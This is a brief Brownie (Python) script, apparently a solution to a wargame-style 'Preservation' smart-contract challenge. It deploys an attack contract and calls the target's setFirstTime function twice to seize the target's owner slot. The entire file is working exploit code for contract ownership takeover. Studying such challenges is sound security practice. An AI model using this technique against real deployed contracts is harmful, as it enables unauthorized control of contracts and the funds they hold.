from scripts.helpful_scripts import get_account
from brownie import interface, PreservationAttack, convert


def main():
    account = get_account()
    attack = PreservationAttack.deploy({"from": account})
    preservation = interface.Preservation("0x6Ea5c645C5cf1900C7EB92bE5366DFE6870f75E5")
    my_address = "0x65C4999968db9EC4e41b9DBb40691132F407EE95"

    tx1 = preservation.setFirstTime(convert.to_uint(attack.address), {"from": account})
    tx1.wait(1)

    tx2 = preservation.setFirstTime(convert.to_uint(my_address), {"from": account})
    tx2.wait(1)

    if preservation.owner() == my_address:
        print("Success!")
    else:
        print("Try again...")
